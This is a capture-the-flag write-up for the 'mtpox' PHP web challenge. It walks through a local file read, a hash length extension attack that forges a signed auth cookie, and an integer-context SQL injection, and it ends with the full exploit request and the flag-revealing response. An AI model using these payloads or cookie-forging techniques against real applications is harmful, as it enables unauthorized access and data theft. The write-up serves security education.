The mtpox webservice had several bugs you needed to take advantage of. 

Bug #1: Local File Read
The service has several webpages, accessible at `index.php?page=index` and 
`index.php?page=about`. I played around and confirmed it was reading files, by
setting `page` to `admin.php`. admin.php is linked to, but tells you that you
are not authorized. If you use the file read bug to include admin.php, you can
grab the source code of the file. Reading the source code, we can spot a number
of other bugs.

Bug #2: Using hash() instead of hash_hmac() for tamper proof cookies

Code snippet:

  $auth = false;
  if (isset($_COOKIE["auth"])) {
     $auth = unserialize($_COOKIE["auth"]);
     $hsh = $_COOKIE["hsh"];
     if ($hsh !== hash("sha256", $SECRET . strrev($_COOKIE["auth"]))) {
       $auth = false;
     }
  }

It unserializes our input before doing the check. This could be dangerous, but
we don't have any useful objects we can serialize. Instead, we can make use of
the hash length extension bug here. This bug lets us append anything to a piece
of hashed data, even if we do not know the value of $SECRET. Because we can
only append, we need to change the serialized value for auth=false (b:0;) to
auth=true (b:1;). Unfortunately, unserialize only reads the first value and
stops there, so appending `b:1;` (to make b:0;b:1;) still yields auth=false.
Luckily for us, hash is reversed before passed into sha256, so we can do it
backwards. We make our payload `b:1;b:0;` (auth=true) and append our addition
backwards (;1:b). I did this using the HashPump tool, available on github.

Once we had that, we could move onto the next bug:

Bug #3: Babby Level SQL Injection

Code snippet:

      $qstr = mysql_real_escape_string($_GET['query']);
      $query = "SELECT amount FROM plaidcoin_wallets WHERE id=$qstr";
      $result = mysql_query($query) or die('Query failed: ' . mysql_error());

Even though $_GET['query'] is being escaped, it's still an integer in the
database. This means we can get SQL injection as long as we avoid any quotes.

Final request:

GET /admin.php?query=-1+union+select+concat(id,0x3a,amount)+from+mtpox.plaidcoin_wallets--+ HTTP/1.1
Host: 54.211.6.40
User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: auth=b%3A1%3B%60%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80b%3A0%3B; hsh=967ca6fa9eacfe716cd74db1b1db85800e451ca85d29bd27782832b9faa16ae1
Connection: keep-alive

Response: 
HTTP/1.1 200 OK
Date: Fri, 11 Apr 2014 23:11:14 GMT
Server: Apache/2.2.22 (Debian)
X-Powered-By: PHP/5.4.4-14+deb7u7
Vary: Accept-Encoding
Content-Length: 127
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html

Wallet -1 union select concat(id,0x3a,amount) from mtpox.plaidcoin_wallets--  contains flag{phpPhPphpPPPphpcoin}:1333337 coins.
